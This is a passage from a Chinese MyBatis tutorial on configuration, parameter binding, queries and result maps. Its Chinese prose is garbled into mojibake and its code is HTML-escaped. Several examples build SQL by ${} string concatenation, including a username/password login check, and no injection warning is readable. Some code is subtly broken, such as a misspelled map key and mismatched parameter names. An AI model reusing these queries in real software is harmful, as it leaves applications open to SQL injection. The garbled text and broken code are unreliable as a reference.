id=\u0026#34;development\u0026#34;\u0026gt; \u0026lt;!-- transactionManager: è®¾ç½®äº‹åŠ¡ç®¡ç†æ–¹å¼ JDBC å½“å‰ç¯å¢ƒæ‰§è¡Œsqlæ—¶ï¼Œä½¿ç”¨JDBCåŸç”Ÿçš„äº‹åŠ¡ç®¡ç†æ–¹å¼ï¼Œäº‹åŠ¡çš„æäº¤å’Œå›æ»šéœ€è¦æ‰‹åŠ¨å¤„ç† MANAGED ï¼š è¢«Springç®¡ç† --\u0026gt; \u0026lt;transactionManager type=\u0026#34;JDBC\u0026#34;/\u0026gt; \u0026lt;!--åˆ¶å®š æ•°æ®æº Type: æ•°æ®ç±»å‹ POOLED æ•°æ®åº“ä½¿ç”¨ç¼“å­˜æ•°æ®åº“è¿æ¥ UNPOOLED ä¸ä½¿ç”¨æ•°æ®åº“è¿æ¥æ±  JNDI ä½¿ç”¨ä¸Šä¸‹æ–‡ä¸­çš„æ•°æ®æº --\u0026gt; \u0026lt;dataSource type=\u0026#34;POOLED\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;driver\u0026#34; value=\u0026#34;${jdbc.driver}\u0026#34;/\u0026gt; \u0026lt;property name=\u0026#34;url\u0026#34; value=\u0026#34;${jdbc.url}\u0026#34;/\u0026gt; \u0026lt;property name=\u0026#34;username\u0026#34; value=\u0026#34;${jdbc.username}\u0026#34;/\u0026gt; \u0026lt;property name=\u0026#34;password\u0026#34; value=\u0026#34;${jdbc.password}\u0026#34;/\u0026gt; \u0026lt;/dataSource\u0026gt; \u0026lt;/environment\u0026gt; \u0026lt;/environments\u0026gt; \u0026lt;!--å¼•å…¥æ˜ å°„æ–‡ä»¶--\u0026gt; \u0026lt;mappers\u0026gt; \u0026lt;!-- \u0026lt;mapper resource=\u0026#34;mappers/UserMapper.xml\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;!-- ä»¥åŒ…ä¸ºå•ä½å¼•å…¥æ˜ å°„æ–‡ä»¶ è¦æ±‚ 1ã€mapperæ¥å£æ‰€åœ¨çš„åŒ…è¦å’Œæ˜ å°„æ–‡ä»¶æ‰€åœ¨çš„åŒ…ä¸€è‡´ 2ã€mapperæ¥å£è¦å’Œæ˜ å°„æ–‡ä»¶çš„åå­—ä¸€è‡´ --\u0026gt; \u0026lt;package name=\u0026#34;com.reus.mybatis.mapper\u0026#34;/\u0026gt; \u0026lt;/mappers\u0026gt; \u0026lt;/configuration\u0026gt; 2 å…·ä½“é…ç½®åŠè°ƒç”¨ åˆ›å»ºmapperæ¥å£\nMyBatisä¸­çš„mapperæ¥å£ç›¸å½“äºä»¥å‰çš„daoã€‚ä½†æ˜¯åŒºåˆ«åœ¨äºï¼Œmapperä»…ä»…æ˜¯æ¥å£ï¼Œæˆ‘ä»¬ä¸éœ€è¦æä¾›å®ç°ç±»\n1 2 3 4 5 6 7 8 package com.reus.mybatis.mapper; public interface UserMapper { /** * æ·»åŠ ç”¨æˆ·ä¿¡æ¯ */ int insertUser(); } åˆ›å»ºå¯¹åº”çš„Mybatisæ˜ å°„æ–‡ä»¶\nç›¸å…³æ¦‚å¿µï¼šORMï¼ˆObject Relationship Mappingï¼‰å¯¹è±¡å…³ç³»æ˜ å°„ã€‚ å¯¹è±¡ï¼šJavaçš„å®ä½“ç±»å¯¹è±¡ å…³ç³»ï¼šå…³ç³»å‹æ•°æ®åº“ æ˜ å°„ï¼šäºŒè€…ä¹‹é—´çš„å¯¹åº”å…³ç³» Javaæ¦‚å¿µ æ•°æ®åº“æ¦‚å¿µ ç±» è¡¨ å±æ€§ å­—æ®µ/åˆ— å¯¹è±¡ è®°å½•/è¡Œ æ˜ å°„æ–‡ä»¶çš„å‘½åè§„åˆ™ è¡¨æ‰€å¯¹åº”çš„å®ä½“ç±»çš„ç±»å+Mapper.xml ä¾‹å¦‚ï¼šè¡¨t_userï¼Œæ˜ å°„çš„å®ä½“ç±»ä¸ºUserï¼Œæ‰€å¯¹åº”çš„æ˜ å°„æ–‡ä»¶ä¸ºUserMapper.xml å› æ­¤ä¸€ä¸ªæ˜ å°„æ–‡ä»¶å¯¹åº”ä¸€ä¸ªå®ä½“ç±»ï¼Œå¯¹åº”ä¸€å¼ è¡¨çš„æ“ä½œ MyBatisæ˜ å°„æ–‡ä»¶ç”¨äºç¼–å†™SQLï¼Œè®¿é—®ä»¥åŠæ“ä½œè¡¨ä¸­çš„æ•°æ® MyBatisæ˜ å°„æ–‡ä»¶å­˜æ”¾çš„ä½ç½®æ˜¯src/main/resources/mappersç›®å½•ä¸‹ MyBatisä¸­å¯ä»¥é¢å‘æ¥å£æ“ä½œæ•°æ®ï¼Œè¦ä¿è¯ä¸¤ä¸ªä¸€è‡´ mapperæ¥å£çš„å…¨ç±»åå’Œæ˜ å°„æ–‡ä»¶çš„å‘½åç©ºé—´ï¼ˆnamespaceï¼‰ä¿æŒä¸€è‡´ mapperæ¥å£ä¸­æ–¹æ³•çš„æ–¹æ³•åå’Œæ˜ å°„æ–‡ä»¶ä¸­ç¼–å†™SQLçš„æ ‡ç­¾çš„idå±æ€§ä¿æŒä¸€è‡´ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; ?\u0026gt; \u0026lt;!DOCTYPE mapper PUBLIC \u0026#34;-//mybatis.org//DTD Mapper 3.0//EN\u0026#34; \u0026#34;http://mybatis.org/dtd/mybatis-3-mapper.dtd\u0026#34;\u0026gt; \u0026lt;mapper namespace=\u0026#34;com.reus.mybatis.mapper.UserMapper\u0026#34;\u0026gt; \u0026lt;!--int insertUser();--\u0026gt; \u0026lt;insert id=\u0026#34;insertUser\u0026#34;\u0026gt; insert into t_user values(null,\u0026#39;å¼ ä¸‰\u0026#39;,\u0026#39;123\u0026#39;,23,\u0026#39;å¥³\u0026#39;,\u0026#39;123@qq.com\u0026#39;) \u0026lt;/insert\u0026gt; \u0026lt;!--updateUser--\u0026gt; \u0026lt;update id=\u0026#34;updateUser\u0026#34;\u0026gt; update t_user set username = \u0026#39;æå››\u0026#39; where id = 4 \u0026lt;/update\u0026gt; \u0026lt;!--void deleteUser();--\u0026gt; \u0026lt;delete id=\u0026#34;deleteUser\u0026#34;\u0026gt; delete from t_user where id = 4 \u0026lt;/delete\u0026gt; \u0026lt;!--User getUserById(); å¿…é¡»è®¾ç½®å¯¹åº”çš„æ ‡ç­¾ resultType å’Œ resultMap resultType : è®¾ç½®é»˜è®¤çš„æ˜ å°„å…³ç³» resultMap: è®¾ç½®è‡ªå®šä¹‰çš„æ˜ å°„å…³ç³» --\u0026gt; \u0026lt;select id=\u0026#34;getUserById\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; select * from t_user where id = 3 \u0026lt;/select\u0026gt; \u0026lt;!--List\u0026lt;User\u0026gt; getAllUser(); --\u0026gt; \u0026lt;select id=\u0026#34;getAllUser\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; select * from t_user; \u0026lt;/select\u0026gt; \u0026lt;/mapper\u0026gt; è·å–é…ç½®ä¸­çš„ä¿¡æ¯\nè¿ç”¨SqlsessionFactory 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 public class UserMapperTest { @Test public void testInsertUser() throws IOException { //è¯»å–MyBatisçš„æ ¸å¿ƒé…ç½®æ–‡ä»¶ InputStream is = Resources.getResourceAsStream(\u0026#34;mybatis-config.xml\u0026#34;); //è·å–SqlSessionFactoryBuilderå¯¹è±¡ SqlSessionFactoryBuilder sqlSessionFactoryBuilder = new SqlSessionFactoryBuilder(); //é€šè¿‡æ ¸å¿ƒé…ç½®æ–‡ä»¶æ‰€å¯¹åº”çš„å­—èŠ‚è¾“å…¥æµåˆ›å»ºå·¥å‚ç±»SqlSessionFactoryï¼Œç”Ÿäº§SqlSessionå¯¹è±¡ SqlSessionFactory sqlSessionFactory = sqlSessionFactoryBuilder.build(is); //è·å–sqlSessionï¼Œæ­¤æ—¶é€šè¿‡SqlSessionå¯¹è±¡æ‰€æ“ä½œçš„sqléƒ½å¿…é¡»æ‰‹åŠ¨æäº¤æˆ–å›æ»šäº‹åŠ¡ //SqlSession sqlSession = sqlSessionFactory.openSession(); //åˆ›å»ºSqlSessionå¯¹è±¡ï¼Œæ­¤æ—¶é€šè¿‡SqlSessionå¯¹è±¡æ‰€æ“ä½œçš„sqléƒ½ä¼šè‡ªåŠ¨æäº¤ SqlSession sqlSession = sqlSessionFactory.openSession(true); //é€šè¿‡ä»£ç†æ¨¡å¼åˆ›å»ºUserMapperæ¥å£çš„ä»£ç†å®ç°ç±»å¯¹è±¡ UserMapper userMapper = sqlSession.getMapper(UserMapper.class); //è°ƒç”¨UserMapperæ¥å£ä¸­çš„æ–¹æ³•ï¼Œå°±å¯ä»¥æ ¹æ®UserMapperçš„å…¨ç±»ååŒ¹é…å…ƒç´ æ–‡ä»¶ï¼Œé€šè¿‡è°ƒç”¨çš„æ–¹æ³•ååŒ¹é…æ˜ å°„æ–‡ä»¶ä¸­çš„SQLæ ‡ç­¾ï¼Œå¹¶æ‰§è¡Œæ ‡ç­¾ä¸­çš„SQLè¯­å¥ int result = userMapper.insertUser(); //æäº¤äº‹åŠ¡ //sqlSession.commit(); System.out.println(\u0026#34;result:\u0026#34; + result); } } 3 è·å–å‚æ•° MyBatisè·å–å‚æ•°å€¼çš„ä¸¤ç§æ–¹å¼ï¼š${}å’Œ#{} ${}çš„æœ¬è´¨å°±æ˜¯å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œ#{}çš„æœ¬è´¨å°±æ˜¯å ä½ç¬¦èµ‹å€¼ ${}ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼æ‹¼æ¥sqlï¼Œè‹¥ä¸ºå­—ç¬¦ä¸²ç±»å‹æˆ–æ—¥æœŸç±»å‹çš„å­—æ®µè¿›è¡Œèµ‹å€¼æ—¶ï¼Œéœ€è¦æ‰‹åŠ¨åŠ å•å¼•å·ï¼›ä½†æ˜¯#{}ä½¿ç”¨å ä½ç¬¦èµ‹å€¼çš„æ–¹å¼æ‹¼æ¥sqlï¼Œæ­¤æ—¶ä¸ºå­—ç¬¦ä¸²ç±»å‹æˆ–æ—¥æœŸç±»å‹çš„å­—æ®µè¿›è¡Œèµ‹å€¼æ—¶ï¼Œå¯ä»¥è‡ªåŠ¨æ·»åŠ å•å¼•å· 3.1 å•ä¸ªå­—é¢é‡ç±»å‹æ•°æ® å•ä¸ªå­—é¢é‡ç±»å‹æ•°æ®\nè‹¥mapperæ¥å£ä¸­çš„æ–¹æ³•å‚æ•°ä¸ºå•ä¸ªçš„å­—é¢é‡ç±»å‹ï¼Œæ­¤æ—¶å¯ä»¥ä½¿ç”¨${}å’Œ#{}ä»¥ä»»æ„çš„åç§°ï¼ˆæœ€å¥½è§åè¯†æ„ï¼‰è·å–å‚æ•°çš„å€¼ï¼Œæ³¨æ„${}éœ€è¦æ‰‹åŠ¨åŠ å•å¼•å· 1 2 3 4 5 6 7 8 9 \u0026lt;!--User getUserByUsername(String username);--\u0026gt; \u0026lt;select id=\u0026#34;getUserByUsername\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; select * from t_user where username = #{username} \u0026lt;/select\u0026gt; \u0026lt;!--User getUserByUsername(String username);--\u0026gt; \u0026lt;select id=\u0026#34;getUserByUsername\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; select * from t_user where username = \u0026#39;${username}\u0026#39; \u0026lt;/select\u0026gt; 3.2 å¤šä¸ªä¸ªå­—é¢é‡ç±»å‹æ•°æ® å¤šä¸ªå­—é¢é‡ç±»å‹çš„å‚æ•°\nè‹¥mapperæ¥å£ä¸­çš„æ–¹æ³•å‚æ•°ä¸ºå¤šä¸ªæ—¶ï¼Œæ­¤æ—¶MyBatisä¼šè‡ªåŠ¨å°†è¿™äº›å‚æ•°æ”¾åœ¨ä¸€ä¸ªmapé›†åˆä¸­\n1 2 1. ä»¥arg0,arg1...ä¸ºé”®ï¼Œä»¥å‚æ•°ä¸ºå€¼ï¼› 2. ä»¥param1,param2...ä¸ºé”®ï¼Œä»¥å‚æ•°ä¸ºå€¼ï¼› å› æ­¤åªéœ€è¦é€šè¿‡\\${}å’Œ#{}è®¿é—®mapé›†åˆçš„é”®å°±å¯ä»¥è·å–ç›¸å¯¹åº”çš„å€¼ï¼Œæ³¨æ„${}éœ€è¦æ‰‹åŠ¨åŠ å•å¼•å·ã€‚\nä½¿ç”¨argæˆ–è€…paraméƒ½è¡Œï¼Œè¦æ³¨æ„çš„æ˜¯ï¼Œargæ˜¯ä»arg0å¼€å§‹çš„ï¼Œparamæ˜¯ä»param1å¼€å§‹çš„\n1 2 3 4 5 6 7 8 9 \u0026lt;!--User checkLogin(String username,String password);--\u0026gt; \u0026lt;select id=\u0026#34;checkLogin\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; select * from t_user where username = #{arg0} and password = #{arg1} \u0026lt;/select\u0026gt; \u0026lt;!--User checkLogin(String username,String password);--\u0026gt; \u0026lt;select id=\u0026#34;checkLogin\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; select * from t_user where username = \u0026#39;${param1}\u0026#39; and password = \u0026#39;${param2}\u0026#39; \u0026lt;/select\u0026gt; 3.3 mapé›†åˆç±»å‹çš„å‚æ•° è‹¥mapperæ¥å£ä¸­çš„æ–¹æ³•éœ€è¦çš„å‚æ•°ä¸ºå¤šä¸ªæ—¶ï¼Œæ­¤æ—¶å¯ä»¥æ‰‹åŠ¨åˆ›å»ºmapé›†åˆï¼Œå°†è¿™äº›æ•°æ®æ”¾åœ¨mapä¸­åªéœ€è¦é€šè¿‡\\${}å’Œ#{}è®¿é—®mapé›†åˆçš„é”®å°±å¯ä»¥è·å–ç›¸å¯¹åº”çš„å€¼ï¼Œæ³¨æ„${}éœ€è¦æ‰‹åŠ¨åŠ å•å¼•å·\nå³æ‰‹åŠ¨åˆ›å»ºä¸€ä¸ªmapé›†åˆï¼Œä½œä¸ºå‚æ•°ä¼ é€’ç»™é…ç½®ï¼Œé…ç½®ä¸­å³å¯ä½¿ç”¨mapæ¥è·å–æ•°æ® 1 2 3 4 \u0026lt;!--User checkLoginByMap(Map\u0026lt;String,Object\u0026gt; map);--\u0026gt; \u0026lt;select id=\u0026#34;checkLoginByMap\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; select * from t_user where username = #{username} and password = #{password} \u0026lt;/select\u0026gt; 1 2 3 4 5 6 7 8 9 10 @Test public void checkLoginByMap() { SqlSession sqlSession = SqlSessionUtils.getSqlSession(); ParameterMapper mapper = sqlSession.getMapper(ParameterMapper.class); Map\u0026lt;String,Object\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(\u0026#34;usermane\u0026#34;,\u0026#34;admin\u0026#34;); map.put(\u0026#34;password\u0026#34;,\u0026#34;123456\u0026#34;); User user = mapper.checkLoginByMap(map); System.out.println(user); } 3.4 å®ä½“ç±»ç±»å‹çš„å‚æ•° è‹¥mapperæ¥å£ä¸­çš„æ–¹æ³•å‚æ•°ä¸ºå®ä½“ç±»å¯¹è±¡æ—¶æ­¤æ—¶å¯ä»¥ä½¿ç”¨\\${}å’Œ#{}ï¼Œé€šè¿‡è®¿é—®å®ä½“ç±»å¯¹è±¡ä¸­çš„å±æ€§åè·å–å±æ€§å€¼ï¼Œæ³¨æ„${}éœ€è¦æ‰‹åŠ¨åŠ å•å¼•å·\nè¿™æ˜¯åº”ä¸ºä¸€ä¸ªç±»å‹ä¸­çš„å‚æ•°åç›¸å½“ä¸map ä¸­çš„key 1 2 3 4 \u0026lt;!--int insertUser(User user);--\u0026gt; \u0026lt;insert id=\u0026#34;insertUser\u0026#34;\u0026gt; insert into t_user values(null,#{username},#{password},#{age},#{sex},#{email}) \u0026lt;/insert\u0026gt; 1 2 3 4 5 6 7 @Test public void insertUser() { SqlSession sqlSession = SqlSessionUtils.getSqlSession(); ParameterMapper mapper = sqlSession.getMapper(ParameterMapper.class); User user = new User(null,\u0026#34;Tom\u0026#34;,\u0026#34;123456\u0026#34;,12,\u0026#34;ç”·\u0026#34;,\u0026#34;123@321.com\u0026#34;); mapper.insertUser(user); } 3.5 ä½¿ç”¨@Paramæ ‡è¯†å‚æ•° å¯ä»¥é€šè¿‡@Paramæ³¨è§£æ ‡è¯†mapperæ¥å£ä¸­çš„æ–¹æ³•å‚æ•°ï¼Œæ­¤æ—¶ï¼Œä¼šå°†è¿™äº›å‚æ•°æ”¾åœ¨mapé›†åˆä¸­\n1 2 3 4 \u0026lt;!--User CheckLoginByParam(@Param(\u0026#34;username\u0026#34;) String username, @Param(\u0026#34;password\u0026#34;) String password);--\u0026gt; \u0026lt;select id=\u0026#34;CheckLoginByParam\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; select * from t_user where username = #{username} and password = #{password} \u0026lt;/select\u0026gt; 4 å„ç§æŸ¥è¯¢ å¦‚æœæŸ¥è¯¢å‡ºçš„æ•°æ®åªæœ‰ä¸€æ¡ï¼Œå¯ä»¥é€šè¿‡\nå®ä½“ç±»å¯¹è±¡æ¥æ”¶ Listé›†åˆæ¥æ”¶ Mapé›†åˆæ¥æ”¶ï¼Œç»“æœ{password=123456, sex=ç”·, id=1, age=23, username=admin} å¦‚æœæŸ¥è¯¢å‡ºçš„æ•°æ®æœ‰å¤šæ¡ï¼Œä¸€å®šä¸èƒ½ç”¨å®ä½“ç±»å¯¹è±¡æ¥æ”¶ï¼Œä¼šæŠ›å¼‚å¸¸TooManyResultsExceptionï¼Œå¯ä»¥é€šè¿‡\nå®ä½“ç±»ç±»å‹çš„LIsté›†åˆæ¥æ”¶ Mapç±»å‹çš„LIsté›†åˆæ¥æ”¶ åœ¨mapperæ¥å£çš„æ–¹æ³•ä¸Šæ·»åŠ @MapKeyæ³¨è§£ å› ä¸ºæŸ¥è¯¢æ•°æ®åªæœ‰ä¸€æ¡è¾ƒä¸ºç®€å•ï¼Œå°±ä¸åœ¨èµ˜è¿°ï¼Œè¿™é‡Œåªè®²ä¸€ä¸‹å¤šæ¡æ•°æ®çš„æƒ…å†µ\nå¤šæ¡æ•°æ®\næ³•ä¸€\næŸ¥è¯¢ç»“æœä¸ºä¸€ä¸ªmapçš„listé›†åˆ 1 2 3 4 5 6 /** * æŸ¥è¯¢æ‰€æœ‰ç”¨æˆ·ä¿¡æ¯ä¸ºmapé›†åˆ * @return * å°†è¡¨ä¸­çš„æ•°æ®ä»¥mapé›†åˆçš„æ–¹å¼æŸ¥è¯¢ï¼Œä¸€æ¡æ•°æ®å¯¹åº”ä¸€ä¸ªmapï¼›è‹¥æœ‰å¤šæ¡æ•°æ®ï¼Œå°±ä¼šäº§ç”Ÿå¤šä¸ªmapé›†åˆï¼Œæ­¤æ—¶å¯ä»¥å°†è¿™äº›mapæ”¾åœ¨ä¸€ä¸ªlisté›†åˆä¸­è·å– */ List\u0026lt;Map\u0026lt;String, Object\u0026gt;\u0026gt; getAllUserToMap(); 1 2 3 4 5 6 7 8 9 10 \u0026lt;!--Map\u0026lt;String, Object\u0026gt; getAllUserToMap();--\u0026gt; \u0026lt;select id=\u0026#34;getAllUserToMap\u0026#34; resultType=\u0026#34;map\u0026#34;\u0026gt; select * from t_user \u0026lt;/select\u0026gt; \u0026lt;!-- ç»“æœï¼š [{password=123456, sex=ç”·, id=1, age=23, username=admin}, {password=123456, sex=ç”·, id=2, age=23, username=å¼ ä¸‰}, {password=123456, sex=ç”·, id=3, age=23, username=å¼ ä¸‰}] --\u0026gt; æ³•äºŒ\næ ¹æ®@MapKeyæŒ‡å®šä¸€ä¸ªä¸»é”® 1 2 3 4 5 6 7 /** * æŸ¥è¯¢æ‰€æœ‰ç”¨æˆ·ä¿¡æ¯ä¸ºmapé›†åˆ * @return * å°†è¡¨ä¸­çš„æ•°æ®ä»¥mapé›†åˆçš„æ–¹å¼æŸ¥è¯¢ï¼Œä¸€æ¡æ•°æ®å¯¹åº”ä¸€ä¸ªmapï¼›è‹¥æœ‰å¤šæ¡æ•°æ®ï¼Œå°±ä¼šäº§ç”Ÿå¤šä¸ªmapé›†åˆï¼Œå¹¶ä¸”æœ€ç»ˆè¦ä»¥ä¸€ä¸ªmapçš„æ–¹å¼è¿”å›æ•°æ®ï¼Œæ­¤æ—¶éœ€è¦é€šè¿‡@MapKeyæ³¨è§£è®¾ç½®mapé›†åˆçš„é”®ï¼Œå€¼æ˜¯æ¯æ¡æ•°æ®æ‰€å¯¹åº”çš„mapé›†åˆ */ @MapKey(\u0026#34;id\u0026#34;) Map\u0026lt;String, Object\u0026gt; getAllUserToMap(); 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;!--Map\u0026lt;String, Object\u0026gt; getAllUserToMap();--\u0026gt; \u0026lt;select id=\u0026#34;getAllUserToMap\u0026#34; resultType=\u0026#34;map\u0026#34;\u0026gt; select * from t_user \u0026lt;/select\u0026gt; \u0026lt;!-- ç»“æœï¼š { 1={password=123456, sex=ç”·, id=1, age=23, username=admin}, 2={password=123456, sex=ç”·, id=2, age=23, username=å¼ ä¸‰}, 3={password=123456, sex=ç”·, id=3, age=23, username=å¼ ä¸‰} } --\u0026gt; 5 ç‰¹æ®ŠSQLçš„æ‰§è¡Œ 5.1 æ¨¡ç³ŠæŸ¥è¯¢ 1 2 3 4 5 6 7 /** * æ ¹æ®ç”¨æˆ·åè¿›è¡Œæ¨¡ç³ŠæŸ¥è¯¢ * @param username * @return java.util.List\u0026lt;com.atguigu.mybatis.pojo.User\u0026gt; * @date 2022/2/26 21:56 */ List\u0026lt;User\u0026gt; getUserByLike(@Param(\u0026#34;username\u0026#34;) String username); 1 2 3 4 5 6 \u0026lt;!--List\u0026lt;User\u0026gt; getUserByLike(@Param(\u0026#34;username\u0026#34;) String username);--\u0026gt; \u0026lt;select id=\u0026#34;getUserByLike\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; \u0026lt;!--select * from t_user where username like \u0026#39;%${mohu}%\u0026#39;--\u0026gt; \u0026lt;!--select * from t_user where username like concat(\u0026#39;%\u0026#39;,#{mohu},\u0026#39;%\u0026#39;)--\u0026gt; select * from t_user where username like \u0026#34;%\u0026#34;#{mohu}\u0026#34;%\u0026#34; \u0026lt;/select\u0026gt; å…¶ä¸­select * from t_user where username like \u0026quot;%\u0026quot;#{mohu}\u0026quot;%\u0026quot;æ˜¯æœ€å¸¸ç”¨çš„ 5.2 æ‰¹é‡åˆ é™¤ åªèƒ½ä½¿ç”¨${}ï¼Œå¦‚æœä½¿ç”¨#{}ï¼Œåˆ™è§£æåçš„sqlè¯­å¥ä¸ºdelete from t_user where id in ('1,2,3')ï¼Œè¿™æ ·æ˜¯å°†1,2,3çœ‹åšæ˜¯ä¸€ä¸ªæ•´ä½“ï¼Œåªæœ‰idä¸º1,2,3çš„æ•°æ®ä¼šè¢«åˆ é™¤ã€‚æ­£ç¡®çš„è¯­å¥åº”è¯¥æ˜¯delete from t_user where id in (1,2,3)ï¼Œæˆ–è€…delete from t_user where id in ('1','2','3')\n1 2 3 4 5 6 7 /** * æ ¹æ®idæ‰¹é‡åˆ é™¤ * @param ids * @return int * @date 2022/2/26 22:06 */ int deleteMore(@Param(\u0026#34;ids\u0026#34;) String ids); 1 2 3 \u0026lt;delete id=\u0026#34;deleteMore\u0026#34;\u0026gt; delete from t_user where id in (${ids}) \u0026lt;/delete\u0026gt; 5.3 åŠ¨æ€è®¾ç½®è¡¨å åªèƒ½ä½¿ç”¨${}ï¼Œå› ä¸ºè¡¨åä¸èƒ½åŠ å•å¼•å·\n1 2 3 4 5 6 7 /** * æŸ¥è¯¢æŒ‡å®šè¡¨ä¸­çš„æ•°æ® * @param tableName * @return java.util.List\u0026lt;com.atguigu.mybatis.pojo.User\u0026gt; * @date 2022/2/27 14:41 */ List\u0026lt;User\u0026gt; getUserByTable(@Param(\u0026#34;tableName\u0026#34;) String tableName); 1 2 3 4 \u0026lt;!--List\u0026lt;User\u0026gt; getUserByTable(@Param(\u0026#34;tableName\u0026#34;) String tableName);--\u0026gt; \u0026lt;select id=\u0026#34;getUserByTable\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; select * from ${tableName} \u0026lt;/select\u0026gt; 5.4 æ·»åŠ åŠŸèƒ½è·å–è‡ªå¢çš„ä¸»é”® ä½¿ç”¨åœºæ™¯\nt_clazz(clazz_id,clazz_name)\nt_student(student_id,student_name,clazz_id) æ·»åŠ ç­çº§ä¿¡æ¯ è·å–æ–°æ·»åŠ çš„ç­çº§çš„id ä¸ºç­çº§åˆ†é…å­¦ç”Ÿï¼Œå³å°†æŸå­¦çš„ç­çº§idä¿®æ”¹ä¸ºæ–°æ·»åŠ çš„ç­çº§çš„id åœ¨mapper.xmlä¸­è®¾ç½®ä¸¤ä¸ªå±æ€§\nuseGeneratedKeysï¼šè®¾ç½®ä½¿ç”¨è‡ªå¢çš„ä¸»é”®\nkeyPropertyï¼šå› ä¸ºå¢åˆ æ”¹æœ‰ç»Ÿä¸€çš„è¿”å›å€¼æ˜¯å—å½±å“çš„è¡Œæ•°ï¼Œå› æ­¤åªèƒ½å°†è·å–çš„è‡ªå¢çš„ä¸»é”®æ”¾åœ¨ä¼ è¾“çš„å‚æ•°userå¯¹è±¡çš„æŸä¸ªå±æ€§ä¸­\n1 2 3 4 5 6 /** * æ·»åŠ ç”¨æˆ·ä¿¡æ¯ * @param user * @date 2022/2/27 15:04 */ void insertUser(User user); 1 2 3 4 \u0026lt;!--void insertUser(User user);--\u0026gt; \u0026lt;insert id=\u0026#34;insertUser\u0026#34; useGeneratedKeys=\u0026#34;true\u0026#34; keyProperty=\u0026#34;id\u0026#34;\u0026gt; insert into t_user values (null,#{username},#{password},#{age},#{sex},#{email}) \u0026lt;/insert\u0026gt; 1 2 3 4 5 6 7 8 9 10 //æµ‹è¯•ç±» @Test public void insertUser() { SqlSession sqlSession = SqlSessionUtils.getSqlSession(); SQLMapper mapper = sqlSession.getMapper(SQLMapper.class); User user = new User(null, \u0026#34;ton\u0026#34;, \u0026#34;123\u0026#34;, 23, \u0026#34;ç”·\u0026#34;, \u0026#34;123@321.com\u0026#34;); mapper.insertUser(user); System.out.println(user); //è¾“å‡ºï¼šuser{id=10, username=\u0026#39;ton\u0026#39;, password=\u0026#39;123\u0026#39;, age=23, sex=\u0026#39;ç”·\u0026#39;, email=\u0026#39;123@321.com\u0026#39;}ï¼Œè‡ªå¢ä¸»é”®å­˜æ”¾åˆ°äº†userçš„idå±æ€§ä¸­ } å› ä¸ºå¦‚æœä¸è®¾ç½®useGeneratedKeys,æˆ‘ä»¬æ’å…¥ä¹‹åï¼Œå¾—åˆ°çš„è¿™ä¸ªuserå¯¹è±¡çš„idæ²¡æœ‰è®¾ç½®ï¼Œä»ä¸ºnullï¼Œå‡å¦‚å®ƒçš„ç›®çš„å³ä¸ºå°†æ•°æ®æ’å…¥åˆ°æ•°æ®åº“ä¸­å¾—åˆ°çš„idè¿”å›ç»™åç«¯çš„userå¯¹è±¡ï¼Œå¯¹å…¶èµ‹å€¼\n6 è‡ªå®šä¹‰æ˜ å°„resultMap resultMapï¼šè®¾ç½®è‡ªå®šä¹‰æ˜ å°„ å±æ€§ï¼š idï¼šè¡¨ç¤ºè‡ªå®šä¹‰æ˜ å°„çš„å”¯ä¸€æ ‡è¯†ï¼Œä¸èƒ½é‡å¤ typeï¼šæŸ¥è¯¢çš„æ•°æ®è¦æ˜ å°„çš„å®ä½“ç±»çš„ç±»å‹ å­æ ‡ç­¾ï¼š idï¼šè®¾ç½®ä¸»é”®çš„æ˜ å°„å…³ç³» resultï¼šè®¾ç½®æ™®é€šå­—æ®µçš„æ˜ å°„å…³ç³» å­æ ‡ç­¾å±æ€§ï¼š propertyï¼šè®¾ç½®æ˜ å°„å…³ç³»ä¸­å®ä½“ç±»ä¸­çš„å±æ€§å columnï¼šè®¾ç½®æ˜ å°„å…³ç³»ä¸­è¡¨ä¸­çš„å­—æ®µå 6.1 ä¸€å¯¹ä¸€æ˜ å°„ è‹¥å­—æ®µåå’Œå®ä½“ç±»ä¸­çš„å±æ€§åä¸ä¸€è‡´ï¼Œåˆ™å¯ä»¥é€šè¿‡resultMapè®¾ç½®è‡ªå®šä¹‰æ˜ å°„ï¼Œå³ä½¿å­—æ®µåå’Œå±æ€§åä¸€è‡´çš„å±æ€§ä¹Ÿè¦æ˜ å°„ï¼Œä¹Ÿå°±æ˜¯å…¨éƒ¨å±æ€§éƒ½è¦åˆ—å‡ºæ¥\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;resultMap id=\u0026#34;empResultMap\u0026#34; type=\u0026#34;Emp\u0026#34;\u0026gt; \u0026lt;id property=\u0026#34;eid\u0026#34; column=\u0026#34;eid\u0026#34;\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;result property=\u0026#34;empName\u0026#34; column=\u0026#34;emp_name\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;age\u0026#34; column=\u0026#34;age\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;sex\u0026#34; column=\u0026#34;sex\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;result property=\u0026#34;email\u0026#34; column=\u0026#34;email\u0026#34;\u0026gt;\u0026lt;/result\u0026gt; \u0026lt;/resultMap\u0026gt; \u0026lt;!--List\u0026lt;Emp\u0026gt; getAllEmp();--\u0026gt; \u0026lt;select id=\u0026#34;getAllEmp\u0026#34; resultMap=\u0026#34;empResultMap\u0026#34;\u0026gt; 